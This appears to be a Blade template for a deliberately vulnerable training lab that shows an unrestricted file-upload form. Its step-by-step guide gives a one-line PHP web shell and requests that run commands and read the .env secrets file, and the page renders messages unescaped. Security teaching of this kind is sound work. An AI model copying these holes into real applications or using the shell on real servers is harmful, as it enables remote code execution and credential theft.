@extends('layouts.app')
@section('title', 'File Upload')

@section('content')
<div class="mb-8">
    <h1 class="text-3xl font-bold text-gray-800">Unrestricted File Upload</h1>
    <p class="text-gray-500 mt-1">Upload any file — including PHP web shells — with no validation.</p>
</div>

{{-- Vuln Info Banner --}}
<div class="bg-orange-50 border border-orange-300 rounded-xl p-4 mb-8 flex items-start gap-3">
    <span class="text-2xl">⚠️</span>
    <div>
        <p class="font-semibold text-orange-800">OWASP A04 — Insecure Design</p>
        <p class="text-sm text-orange-700 mt-1">
            The server does <strong>not</strong> validate file type, MIME type, or extension.
            Upload a <code class="bg-orange-100 px-1 rounded font-mono">.php</code> file and access it at
            <code class="bg-orange-100 px-1 rounded font-mono">/uploads/your-file.php</code> to execute arbitrary code.
        </p>
    </div>
</div>

<div class="grid grid-cols-1 lg:grid-cols-2 gap-8">

    {{-- Upload Form --}}
    <div class="bg-white rounded-xl shadow p-8 border-l-4 border-orange-500">
        <h2 class="text-xl font-semibold text-gray-800 mb-6 flex items-center gap-2">
            <span>📤</span> Upload File
        </h2>

        @if (session('success'))
            <div class="bg-green-50 border border-green-300 text-green-800 rounded-lg p-4 mb-5 text-sm">
                {!! session('success') !!}
            </div>
        @endif

        @if (session('error'))
            <div class="bg-red-50 border border-red-300 text-red-700 rounded-lg p-4 mb-5 text-sm">
                {{ session('error') }}
            </div>
        @endif

        <form method="POST" action="/student/upload" enctype="multipart/form-data">
            @csrf
            <div class="mb-6">
                <label class="block text-sm font-medium text-gray-700 mb-2">Choose File</label>
                <div class="border-2 border-dashed border-gray-300 rounded-xl p-6 text-center hover:border-orange-400 transition">
                    <span class="text-4xl block mb-2">📂</span>
                    <p class="text-sm text-gray-500 mb-3">Any file type accepted — no restrictions</p>
                    <input type="file" name="avatar" id="avatar"
                           class="block w-full text-sm text-gray-700 file:mr-3 file:py-2 file:px-4
                                  file:rounded-lg file:border-0 file:font-medium
                                  file:bg-orange-100 file:text-orange-700 hover:file:bg-orange-200 cursor-pointer">
                </div>
            </div>
            <button type="submit"
                    class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-2.5 rounded-lg transition">
                Upload File
            </button>
        </form>
    </div>

    {{-- Exploit Guide --}}
    <div class="bg-white rounded-xl shadow p-8 border-l-4 border-red-400">
        <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
            <span>🧪</span> Lab Exploit Guide
        </h2>

        <ol class="space-y-4 text-sm text-gray-700">
            <li class="flex gap-3">
                <span class="flex-shrink-0 w-6 h-6 rounded-full bg-red-100 text-red-700 font-bold text-xs flex items-center justify-center">1</span>
                <div>
                    <p class="font-medium">Create a PHP web shell</p>
                    <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
                        &lt;?php system($_GET['cmd']); ?&gt;
                    </div>
                    <p class="text-gray-400 mt-1">Save as <code class="bg-gray-100 px-1 rounded">shell.php</code></p>
                </div>
            </li>
            <li class="flex gap-3">
                <span class="flex-shrink-0 w-6 h-6 rounded-full bg-red-100 text-red-700 font-bold text-xs flex items-center justify-center">2</span>
                <div>
                    <p class="font-medium">Upload the file using the form</p>
                    <p class="text-gray-400 mt-1">No validation — the file will be accepted.</p>
                </div>
            </li>
            <li class="flex gap-3">
                <span class="flex-shrink-0 w-6 h-6 rounded-full bg-red-100 text-red-700 font-bold text-xs flex items-center justify-center">3</span>
                <div>
                    <p class="font-medium">Execute commands via the shell</p>
                    <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
                        /uploads/shell.php?cmd=whoami<br>
                        /uploads/shell.php?cmd=cat+.env
                    </div>
                </div>
            </li>
        </ol>
    </div>

</div>

{{-- Uploaded Files List --}}
<div class="mt-8 bg-white rounded-xl shadow p-8 border-l-4 border-gray-400">
    <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
        <span>📋</span> Uploaded Files
        <span class="ml-2 text-sm font-normal text-gray-400">({{ $files->count() }} file{{ $files->count() !== 1 ? 's' : '' }})</span>
    </h2>

    @if ($files->isEmpty())
        <p class="text-sm text-gray-400 text-center py-6">No files uploaded yet.</p>
    @else
        <div class="overflow-x-auto">
            <table class="w-full text-sm">
                <thead>
                    <tr class="bg-gray-50 text-left text-xs font-semibold text-gray-500 uppercase tracking-wide">
                        <th class="px-4 py-3 rounded-tl-lg">#</th>
                        <th class="px-4 py-3">Filename</th>
                        <th class="px-4 py-3">Size (KB)</th>
                        <th class="px-4 py-3">Type</th>
                        <th class="px-4 py-3 rounded-tr-lg">Action</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-gray-100">
                    @foreach ($files as $i => $file)
                        @php
                            $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
                            $isDanger = in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'phar']);
                        @endphp
                        <tr class="hover:bg-gray-50 transition {{ $isDanger ? 'bg-red-50' : '' }}">
                            <td class="px-4 py-3 text-gray-400">{{ $i + 1 }}</td>
                            <td class="px-4 py-3 font-mono font-medium {{ $isDanger ? 'text-red-700' : 'text-gray-800' }}">
                                {{ $file['name'] }}
                                @if ($isDanger)
                                    <span class="ml-2 text-xs bg-red-100 text-red-600 px-1.5 py-0.5 rounded font-sans">shell</span>
                                @endif
                            </td>
                            <td class="px-4 py-3 text-gray-500">{{ $file['size'] }} KB</td>
                            <td class="px-4 py-3">
                                <span class="text-xs px-2 py-0.5 rounded font-mono
                                    {{ $isDanger ? 'bg-red-100 text-red-700' : 'bg-gray-100 text-gray-600' }}">
                                    .{{ $ext }}
                                </span>
                            </td>
                            <td class="px-4 py-3 flex items-center gap-3">
                                <a href="{{ $file['url'] }}" target="_blank"
                                   class="text-blue-600 hover:underline text-xs">Open</a>
                                @if ($isDanger)
                                    <a href="{{ $file['url'] }}?cmd=whoami" target="_blank"
                                       class="text-red-600 hover:underline text-xs font-medium">▶ Execute</a>
                                @endif
                            </td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
    @endif
</div>
@endsection
